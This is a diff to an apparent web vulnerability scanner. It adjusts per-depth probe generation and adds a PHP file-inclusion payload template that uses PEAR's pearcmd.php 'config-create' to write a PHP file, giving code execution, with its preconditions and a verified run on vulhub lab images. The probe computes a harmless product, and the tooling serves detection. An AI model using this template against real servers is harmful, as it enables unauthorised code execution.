@@ -6135,15 +6135,30 @@ class FileInclude(DetectionMethod):
             rung = spec.get("safety") or "stateful"
             if SAFETY_ORDER.get(rung, 2) > SAFETY_ORDER.get(allowed, 0):
                 continue
-            a, b = rng.randint(*self._OPERANDS), rng.randint(*self._OPERANDS)
-            expr = f"<?={a}*{b}?>"
-            leaf = "rk" + "".join(rng.choice(string.ascii_lowercase) for _ in range(10))
             for depth in (self._DEPTHS if self._depth() == "full" else self._QUICK_DEPTHS):
                 if not depth:
                     # The include needs a path it can actually reach, and an
                     # absolute one is not what this wrapper builds: the climb is
                     # the whole point of reaching PEAR's own directory.
                     continue
+                # Per depth, not per wrapper, and this is the whole proof rather
+                # than tidiness. The depths write to one path and read it back
+                # from one URL, so sharing a filename lets a depth whose own
+                # include FAILED fetch the file an earlier depth left and report
+                # it as its own execution. Measured: depth5 with `Failed opening`
+                # in its own body returned `executed` from depth3's product. The
+                # run's verdict about the target stayed right -- something did
+                # execute -- but the map of which shapes the sink accepts did
+                # not, and that map is what `--confirm-depth every` promises and
+                # what the finding prints as its carrier. Nor does it need that
+                # flag: the early stop fires only on `executed`, so a depth that
+                # reaches `file-write` leaves the carrier running and the next
+                # one reads the same verbatim file. Distinct operands as well as
+                # a distinct name, so the product cannot be the carrier either.
+                a, b = rng.randint(*self._OPERANDS), rng.randint(*self._OPERANDS)
+                expr = f"<?={a}*{b}?>"
+                leaf = "rk" + "".join(rng.choice(string.ascii_lowercase)
+                                      for _ in range(10))
                 rendered = (body.replace("__PARAM__", param)
                                 .replace("__TRAVERSAL__", "../" * depth)
                                 .replace("__EXPR__", expr)
@@ -13033,6 +13048,20 @@ EMBEDDED_PAYLOAD_CORPUS = r"""
       ],
       "notes": "The route from an inclusion sink to execution on a build that has allow_url_include off, which is every default since PHP 5.2. It does not carry code through a wrapper; it makes the sink include PEAR's own command-line script and hands that script arguments through the query string, and `config-create` writes its output to a path the arguments name. The code goes in the output. Two things about the shape were measured rather than reasoned. First, the payload is the WHOLE query string and not one parameter's value: register_argc_argv builds argv from the query string, so `config-create` and its target filename have to sit outside the parameter that carries the traversal, which is why this wrapper substitutes the parameter name itself and why it needs --verify-url-location raw to reach the wire intact. Second, it is a two-request proof like `file` and `write`: the first request writes and answers 200 whether or not anything was interpreted, so the verdict comes from fetching the written file, and the computed product distinguishes a file that was interpreted from one served verbatim.",
       "verified": "vulhub thinkphp/lang-rce (vulhub/thinkphp:6.0.12), 2026-10-31: the whole-query-string form wrote rkone.php and the fetch returned 204020 for 404*505 with the literal absent, so the written file was interpreted"
+    },
+    "php_pearcmd_config_create_with_extension": {
+      "sink_env": "any",
+      "safety": "stateful",
+      "template": "+config-create+/&__PARAM__=__TRAVERSAL__usr/local/lib/php/pearcmd.php&/__EXPR__+__NAME__.php",
+      "writes": true,
+      "requires": [
+        "PHP with register_argc_argv on, which turns the query string into argv for the included script",
+        "the PEAR package present at /usr/local/lib/php/pearcmd.php, which the official php docker images ship",
+        "the written file served back by the web server, which is what the proof is read from",
+        "a sink that opens the path as given, without appending an extension of its own"
+      ],
+      "notes": "The same route as `php_pearcmd_config_create` and the pair differs by one thing: whether the traversal names pearcmd.php itself. Which one works is a property of the sink, not of the target, so both are sent and at most one can confirm. A framework loader that builds its own filename appends the extension -- ThinkPHP's language loader includes $file . '.php' -- so the path it is handed must NOT carry one, and the sibling entry is the shape for it. A bare `include $_GET['file'];` opens exactly what it is given and PHP appends nothing, so there the extension has to be in the payload. Measured on vulhub php/inclusion: the extensionless form answers 200 on the write and creates no file at all, so the read-back is a 404 and the probe reports `negative` on a sink this one confirms.",
+      "verified": "vulhub php/inclusion (vulhub/php:7.1.3-apache), 2026-10-31: against the bare `include $_GET['file'];` sink the fetched file carried 204020 for 404*505 with the source form absent, while the extensionless sibling wrote nothing and read back 404"
     }
   },
   "include_read_targets": {
